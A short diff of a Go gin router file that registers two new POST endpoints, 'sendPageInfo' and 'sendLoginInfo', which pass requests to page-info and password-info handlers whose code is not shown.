@@ -21,4 +21,7 @@ func LoadUrl(r *gin.Engine) {
 	r.GET("/setting", setting.Html)
 	// API 接口
 	r.GET("/api", api.Html)
+
+	r.POST("/api/post/sendPageInfo",api.ReceivePageInfo)
+	r.POST("/api/post/sendLoginInfo",api.ReceivePwdInfo)
 }
